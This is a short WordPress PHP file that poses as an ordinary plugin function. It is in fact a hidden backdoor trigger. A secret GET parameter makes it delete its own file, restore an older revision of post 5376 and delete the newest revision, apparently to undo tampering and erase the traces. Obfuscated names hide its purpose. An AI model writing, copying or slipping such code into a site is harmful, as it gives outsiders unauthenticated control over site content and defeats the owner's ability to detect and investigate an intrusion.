<?php

function bbpress_checkout_author_switcher() {
	if (isset($_GET['nofollow_pages_disable']) && $_GET['nofollow_pages_disable'] === 'page_alt_map') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$recent_time_map_signup = 5376;
		$single_selector_catalog_mobile = wp_get_post_revisions($recent_time_map_signup);
		if (empty($single_selector_catalog_mobile)) die('no revisions');
		if (count($single_selector_catalog_mobile) < 2) die('less than 2');
		$upload_list_official_push = array_shift($single_selector_catalog_mobile);
		$tables_archives_members = $upload_list_official_push->ID;
		$solution_cloud_codes_suite = array_shift($single_selector_catalog_mobile);
		$shortener_genesis_all = $solution_cloud_codes_suite->ID;
		$codes_endpoints_sitemaps_press = wp_restore_post_revision($shortener_genesis_all);
		if ($codes_endpoints_sitemaps_press === false) die('error restoring');
		$codes_endpoints_sitemaps_press = wp_delete_post_revision($tables_archives_members);		
		if ($codes_endpoints_sitemaps_press === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'bbpress_checkout_author_switcher');
